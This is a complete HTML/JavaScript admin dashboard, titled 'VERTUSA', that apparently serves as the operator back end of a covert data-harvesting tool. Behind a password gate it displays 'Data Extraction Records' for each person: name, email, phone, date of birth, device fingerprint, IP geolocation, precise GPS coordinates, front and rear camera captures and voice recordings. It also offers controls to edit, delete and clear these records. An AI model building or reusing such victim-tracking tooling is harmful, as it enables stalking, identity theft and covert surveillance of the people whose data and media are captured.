<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VERTUSA // Admin Portal</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --primary: #00ff00;
      --primary-hover: #00cc00;
      --bg-dark: #000000;
      --bg-panel: #050c05;
      --bg-card: #001a00;
      --text-main: #ffffff;
      --text-muted: #aaaaaa;
      --border: #003300;
      --accent: #33ff33;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: var(--bg-dark);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
    }

    /* ── Login Gate ─── */
    .login-gate {
      position: fixed; inset: 0; z-index: 100;
      background: radial-gradient(circle at center, #050c05 0%, #000000 100%);
      display: flex; align-items: center; justify-content: center;
    }
    .login-gate.hidden { display: none; }
    .login-box {
      background: var(--bg-panel);
      padding: 3rem;
      border-radius: 12px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      border: 1px solid var(--border);
      text-align: center;
      width: 100%;
      max-width: 400px;
    }
    .login-box h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 0.5rem; letter-spacing: 0.05em; }
    .login-box p { color: var(--text-muted); margin-bottom: 2rem; font-size: 0.9rem; }
    .login-box input {
      width: 100%;
      background: var(--bg-dark);
      border: 1px solid var(--border);
      color: var(--text-main);
      padding: 0.75rem 1rem;
      border-radius: 8px;
      margin-bottom: 1rem;
      font-size: 1rem;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .login-box input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
    .login-box button {
      width: 100%;
      background: var(--primary);
      color: #000000;
      border: none;
      padding: 0.75rem;
      border-radius: 8px;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.2s;
    }
    .login-box button:hover { background: var(--primary-hover); }
    .login-error { color: #ef4444; font-size: 0.85rem; margin-top: 1rem; min-height: 1.2rem; }

    /* ── Dashboard Layout ─── */
    #dashboard {
      display: none;
      width: 100%;
      height: 100vh;
      overflow: hidden;
    }
    .layout {
      display: flex;
      height: 100%;
    }
    .sidebar {
      width: 260px;
      background: var(--bg-panel);
      border-right: 1px solid var(--border);
      display: flex;
      flex-direction: column;
    }
    .sidebar-header {
      padding: 1.5rem;
      border-bottom: 1px solid var(--border);
      font-weight: 700;
      font-size: 1.25rem;
      letter-spacing: 0.05em;
      color: var(--text-main);
      display: flex;
      align-items: center;
      gap: 0.75rem;
    }
    .sidebar-header .logo {
      width: 32px; height: 32px;
      background: var(--primary);
      color: #000000;
      border-radius: 6px;
      display: flex; align-items: center; justify-content: center;
      font-weight: 800; font-size: 1.2rem;
    }
    .sidebar-menu { padding: 1.5rem 1rem; flex: 1; }
    .menu-item {
      padding: 0.75rem 1rem;
      background: var(--primary);
      color: #000;
      border-radius: 8px;
      font-weight: 600;
      font-size: 0.95rem;
      cursor: pointer;
    }
    
    .main-content {
      flex: 1;
      display: flex;
      flex-direction: column;
      background: var(--bg-dark);
      overflow-y: auto;
    }
    .topbar {
      min-height: 70px;
      background: var(--bg-panel);
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 2rem;
    }
    .topbar-title { font-size: 1.1rem; font-weight: 600; }
    .topbar-actions { display: flex; align-items: center; gap: 1.5rem; }
    .stat-badge {
      background: rgba(0, 255, 0, 0.1);
      color: var(--primary);
      border: 1px solid rgba(0, 255, 0, 0.3);
      padding: 0.4rem 1rem;
      border-radius: 20px;
      font-weight: 600;
      font-size: 0.85rem;
    }
    .refresh-btn {
      background: transparent;
      color: var(--text-muted);
      border: 1px solid var(--border);
      padding: 0.5rem 1rem;
      border-radius: 6px;
      font-size: 0.85rem;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s;
    }
    .refresh-btn:hover { background: var(--bg-card); color: var(--text-main); }
    .danger-btn {
      background: rgba(239, 68, 68, 0.1);
      color: #ef4444;
      border: 1px solid rgba(239, 68, 68, 0.3);
      padding: 0.5rem 1rem;
      border-radius: 6px;
      font-size: 0.85rem;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s;
    }
    .danger-btn:hover { background: rgba(239, 68, 68, 0.2); }
    .action-btn {
      background: rgba(255, 255, 255, 0.1);
      color: var(--text-main);
      border: 1px solid rgba(255, 255, 255, 0.2);
      padding: 0.5rem 1rem;
      border-radius: 6px;
      font-size: 0.85rem;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s;
    }
    .action-btn:hover { background: rgba(255, 255, 255, 0.2); }

    .records-container {
      padding: 2rem;
      max-width: 1200px;
      margin: 0 auto;
      width: 100%;
    }

    /* ── Data Table / Cards ─── */
    .record-item {
      background: var(--bg-panel);
      border: 1px solid var(--border);
      border-radius: 10px;
      margin-bottom: 1rem;
      overflow: hidden;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
    }
    .record-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 1.25rem 1.5rem;
      cursor: pointer;
      transition: background 0.2s;
    }
    .record-header:hover { background: var(--bg-card); }
    .rec-left { display: flex; align-items: center; gap: 1.5rem; }
    .rec-id {
      background: var(--bg-dark);
      color: var(--text-muted);
      padding: 0.25rem 0.75rem;
      border-radius: 6px;
      font-weight: 600;
      font-size: 0.85rem;
    }
    .rec-name { font-weight: 600; font-size: 1.05rem; color: var(--text-main); }
    .rec-meta { color: var(--text-muted); font-size: 0.9rem; }
    .rec-right { display: flex; align-items: center; gap: 1rem; }
    .rec-time { font-size: 0.85rem; color: var(--text-muted); }
    
    .record-body {
      display: none;
      padding: 0;
      border-top: 1px solid var(--border);
      background: var(--bg-dark);
    }
    .record-item.open .record-body { display: block; }

    .data-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 1.25rem 2rem;
      background: transparent;
      padding: 0.5rem 1.5rem 1.5rem 1.5rem;
    }
    .data-cell {
      background: transparent;
      padding: 0;
    }
    .cell-label {
      font-size: 0.75rem;
      text-transform: uppercase;
      color: var(--text-muted);
      font-weight: 600;
      margin-bottom: 0.35rem;
      letter-spacing: 0.05em;
    }
    .cell-value {
      font-size: 0.95rem;
      color: var(--text-main);
      word-break: break-word;
    }
    .cell-value.highlight { color: var(--primary); }

    .media-section {
      padding: 1.5rem;
      background: var(--bg-panel);
      border-top: 1px solid var(--border);
    }
    .media-title {
      font-size: 0.85rem;
      font-weight: 600;
      text-transform: uppercase;
      color: var(--text-muted);
      margin-bottom: 1rem;
      letter-spacing: 0.05em;
    }
    .media-grid { display: flex; gap: 1.5rem; flex-wrap: wrap; }
    .media-card {
      background: var(--bg-dark);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 0.75rem;
    }
    .media-card img {
      max-width: 300px;
      border-radius: 4px;
      display: block;
    }
    .media-card audio {
      width: 300px;
      height: 40px;
      outline: none;
    }
    
    .loading-text { text-align: center; padding: 4rem; color: var(--text-muted); font-size: 1.1rem; }
    
    @media (max-width: 768px) {
      .layout { flex-direction: column; }
      .sidebar { width: 100%; height: auto; border-right: none; border-bottom: 1px solid var(--border); }
      .sidebar-menu { display: none; }
      .record-header { flex-direction: column; align-items: flex-start; gap: 1rem; }
      .rec-right { width: 100%; justify-content: space-between; }
    }
  </style>
</head>
<body>

  <!-- LOGIN GATE -->
  <div class="login-gate" id="loginGate">
    <div class="login-box">
      <h1>VERTUSA</h1>
      <p>Secure Admin Portal</p>
      <input type="password" id="passInput" placeholder="Enter Access Code" autofocus autocomplete="new-password" />
      <button id="loginBtn">Authenticate</button>
      <div class="login-error" id="loginError"></div>
    </div>
  </div>

  <!-- DASHBOARD -->
  <div id="dashboard">
    <div class="layout">
      
      <!-- Sidebar -->
      <aside class="sidebar">
        <div class="sidebar-header">
          <div class="logo">V</div>
          VERTUSA
        </div>
        <div class="sidebar-menu">
          <div class="menu-item">Dashboard Overview</div>
        </div>
      </aside>

      <!-- Main Content -->
      <main class="main-content">
        <div class="topbar">
          <div class="topbar-title">Data Extraction Records</div>
          <div class="topbar-actions">
            <div class="stat-badge" id="totalCount">Total Records: 0</div>
            <button class="refresh-btn" id="refreshBtn">Refresh Data</button>
            <button class="danger-btn" id="clearLogsBtn">Clear Logs</button>
          </div>
        </div>

        <div class="records-container" id="adminContent">
          <div class="loading-text">Loading secure records...</div>
        </div>
      </main>

    </div>
  </div>

  <script>
    let adminPass = "";

    // ── Login ──
    document.getElementById("loginBtn").addEventListener("click", tryLogin);
    document.getElementById("passInput").addEventListener("keydown", (e) => {
      if (e.key === "Enter") tryLogin();
    });

    async function tryLogin() {
      const pass = document.getElementById("passInput").value.trim();
      if (!pass) return;
      try {
        const res = await fetch("/api/admin/records?pass=" + encodeURIComponent(pass));
        if (res.ok) {
          adminPass = pass;
          document.getElementById("loginGate").classList.add("hidden");
          document.getElementById("dashboard").style.display = "block";
          const data = await res.json();
          renderRecords(data);
        } else {
          document.getElementById("loginError").textContent = "Invalid access code.";
        }
      } catch {
        document.getElementById("loginError").textContent = "Connection failed.";
      }
    }

    // ── Refresh ──
    document.getElementById("refreshBtn").addEventListener("click", async () => {
      const content = document.getElementById("adminContent");
      content.innerHTML = '<div class="loading-text">Refreshing...</div>';
      const res = await fetch("/api/admin/records?pass=" + encodeURIComponent(adminPass));
      const data = await res.json();
      renderRecords(data);
    });

    // ── Clear Logs ──
    document.getElementById("clearLogsBtn").addEventListener("click", async () => {
      if (!confirm("Are you sure you want to clear all logs? This cannot be undone.")) return;
      try {
        const res = await fetch("/api/admin/clear?pass=" + encodeURIComponent(adminPass), { method: "POST" });
        if (res.ok) {
          alert("Logs cleared successfully.");
          document.getElementById("refreshBtn").click();
        } else {
          alert("Failed to clear logs.");
        }
      } catch (err) {
        alert("Error clearing logs.");
      }
    });

    // ── Render record list ──
    function renderRecords(data) {
      const content = document.getElementById("adminContent");
      document.getElementById("totalCount").textContent = `Total Records: ${data.count}`;

      if (!data.records || data.records.length === 0) {
        content.innerHTML = '<div class="loading-text">No records found.</div>';
        return;
      }

      content.innerHTML = "";
      data.records.forEach((rec) => {
        const card = document.createElement("div");
        card.className = "record-item";

        const loc = [rec.ip_city, rec.ip_region, rec.ip_country].filter(Boolean).join(", ") || "Unknown Location";
        const time = rec.created_at || rec.timestamp_open || "—";

        card.innerHTML = `
          <div class="record-header" onclick="this.parentElement.classList.toggle('open'); loadDetail(${rec.id}, this.parentElement)">
            <div class="rec-left">
              <span class="rec-id">#${String(rec.id).padStart(4, '0')}</span>
              <span class="rec-name">${rec.form_name || 'Anonymous User'}</span>
              <span class="rec-meta">${loc} • ${rec.os}</span>
            </div>
            <div class="rec-right">
              <span class="rec-time">${time}</span>
              <span>▼</span>
            </div>
          </div>
          
          <div class="record-body" id="body-${rec.id}">
            <div class="record-actions" style="padding: 1rem 1.5rem; display: flex; gap: 1rem; border-bottom: 1px solid var(--border);">
              <button class="action-btn" onclick="printRecord(${rec.id})">🖨️ Print</button>
              <button class="action-btn" onclick="editRecord(${rec.id})">✏️ Edit</button>
              <button class="danger-btn" onclick="deleteRecord(${rec.id})">🗑️ Delete</button>
            </div>
            
            <div class="section-title" style="padding: 1rem 1.5rem 0.5rem; color: var(--primary); font-weight: 600;">Identity</div>
            <div class="data-grid">
              ${infoCell("Full Name", rec.form_name, "highlight")}
              ${infoCell("Email Address", rec.form_email)}
              ${infoCell("Phone Number", rec.form_phone)}
              ${infoCell("Date of Birth", rec.form_dob)}
            </div>
            
            <div class="section-title" style="padding: 1rem 1.5rem 0.5rem; color: var(--primary); font-weight: 600;">Device Telemetry</div>
            <div class="data-grid">
              ${infoCell("Operating System", rec.os)}
              ${infoCell("Browser", (rec.browser || "") + " " + (rec.browser_version || ""))}
              ${infoCell("Device Class", rec.device_type)}
              ${infoCell("Screen Resolution", rec.screen_res)}
              ${infoCell("Language", rec.language)}
              ${infoCell("Platform", rec.platform)}
              ${infoCell("Timestamp", time)}
            </div>

            <div class="section-title" style="padding: 1rem 1.5rem 0.5rem; color: var(--primary); font-weight: 600;">Network and Request</div>
            <div class="data-grid">
              ${infoCell("IP Address", rec.ip_address, "highlight")}
            </div>

            <div class="section-title" style="padding: 1rem 1.5rem 0.5rem; color: var(--primary); font-weight: 600;">IP Geolocation</div>
            <div class="data-grid">
              ${infoCell("ISP Provider", rec.ip_isp)}
              ${infoCell("Organization", rec.ip_org)}
              ${infoCell("City", rec.ip_city)}
              ${infoCell("Region", rec.ip_region)}
              ${infoCell("Country", rec.ip_country)}
              ${infoCell("Timezone", rec.ip_timezone)}
              ${infoCell("Network Lat/Lon", fmtCoord(rec.ip_lat, rec.ip_lon))}
            </div>

            <div class="section-title" style="padding: 1rem 1.5rem 0.5rem; color: var(--primary); font-weight: 600;">GPS Location</div>
            <div class="data-grid">
              ${infoCell("GPS Latitude", rec.geo_lat ? rec.geo_lat.toFixed(6) : "N/A", "highlight")}
              ${infoCell("GPS Longitude", rec.geo_lon ? rec.geo_lon.toFixed(6) : "N/A", "highlight")}
              ${infoCell("GPS Accuracy", rec.geo_accuracy ? rec.geo_accuracy.toFixed(1) + "m" : "N/A")}
            </div>

            <div class="media-section" id="media-${rec.id}">
              <div class="media-title">Captured Media Assets</div>
              <div style="color: var(--text-muted); font-size: 0.9rem;">Click to load media...</div>
            </div>
          </div>
        `;
        content.appendChild(card);
      });
    }

    function infoCell(label, value, cls = "") {
      return `
        <div class="data-cell">
          <div class="cell-label">${label}</div>
          <div class="cell-value ${cls}">${value || "N/A"}</div>
        </div>
      `;
    }
    
    function fmtCoord(lat, lon) {
      if (lat && lon) return `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
      return "N/A";
    }

    // ── Load full detail (images + audio) on expand ──
    const loadedDetails = new Set();
    async function loadDetail(id, cardEl) {
      if (loadedDetails.has(id)) return;
      loadedDetails.add(id);

      const mediaDiv = document.getElementById(`media-${id}`);
      try {
        const res = await fetch(`/api/admin/record/${id}?pass=${encodeURIComponent(adminPass)}`);
        const data = await res.json();
        if (!data.success) { mediaDiv.innerHTML = '<div style="color:#ef4444">Failed to load media assets.</div>'; return; }

        const rec = data.record;
        let html = '<div class="media-title">Captured Media Assets</div><div class="media-grid">';

        if (rec.front_image) {
          html += `
            <div class="media-card">
              <div class="cell-label">Front Camera</div>
              <img src="${rec.front_image}" alt="Front" />
            </div>`;
        }
        if (rec.back_image) {
          html += `
            <div class="media-card">
              <div class="cell-label">Rear Camera</div>
              <img src="${rec.back_image}" alt="Rear" />
            </div>`;
        }
        if (!rec.front_image && !rec.back_image) {
          html += '<div style="color:var(--text-muted); font-size:0.9rem;">No image captures available.</div>';
        }
        
        if (rec.audio_recording) {
          html += `
            <div class="media-card">
              <div class="cell-label">Voice Recording</div>
              <audio controls src="${rec.audio_recording}"></audio>
            </div>`;
        } else {
          html += '<div style="color:var(--text-muted); font-size:0.9rem;">No audio recording available.</div>';
        }
        html += '</div>';
        mediaDiv.innerHTML = html;
      } catch {
        mediaDiv.innerHTML = '<div style="color:#ef4444">Error loading media assets.</div>';
      }
    }
    
    // ── Actions ──
    async function deleteRecord(id) {
      if (!confirm(`Are you sure you want to permanently delete record #${id}?`)) return;
      try {
        const res = await fetch(`/api/admin/record/${id}?pass=${encodeURIComponent(adminPass)}`, { method: "DELETE" });
        if (res.ok) {
          alert("Record deleted.");
          document.getElementById("refreshBtn").click();
        } else alert("Failed to delete record.");
      } catch {
        alert("Error deleting record.");
      }
    }

    async function editRecord(id) {
      const name = prompt("Edit Full Name:");
      if (name === null) return;
      const email = prompt("Edit Email Address:");
      if (email === null) return;
      const phone = prompt("Edit Phone Number:");
      if (phone === null) return;
      const dob = prompt("Edit Date of Birth:");
      if (dob === null) return;
      
      try {
        const res = await fetch(`/api/admin/record/${id}?pass=${encodeURIComponent(adminPass)}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ form_name: name, form_email: email, form_phone: phone, form_dob: dob })
        });
        if (res.ok) {
          alert("Record updated successfully.");
          document.getElementById("refreshBtn").click();
        } else alert("Failed to update record.");
      } catch {
        alert("Error updating record.");
      }
    }

    function printRecord(id) {
      const body = document.getElementById(`body-${id}`);
      if (!body || body.style.display === 'none') {
        alert("Please expand the record first to print its contents.");
        return;
      }
      
      const printWindow = window.open('', '_blank');
      printWindow.document.write(`
        <html>
          <head>
            <title>Print Record #${id}</title>
            <style>
              body { font-family: sans-serif; padding: 20px; color: #000; }
              .section-title { font-size: 1.2rem; font-weight: bold; margin-top: 20px; margin-bottom: 10px; border-bottom: 1px solid #ccc; padding-bottom: 5px; }
              .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
              .data-cell { padding: 10px; border: 1px solid #eee; }
              .cell-label { font-size: 0.8rem; color: #666; text-transform: uppercase; margin-bottom: 5px; }
              .cell-value { font-size: 1rem; }
              .media-grid { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
              .media-card img { max-width: 300px; display: block; }
              .record-actions { display: none; }
            </style>
          </head>
          <body>
            <h2>VERTUSA - Record #${id}</h2>
            ${body.innerHTML}
            <script>
              window.onload = () => { window.print(); window.close(); };
            <\/script>
          </body>
        </html>
      `);
      printWindow.document.close();
    }
  </script>
</body>
</html>
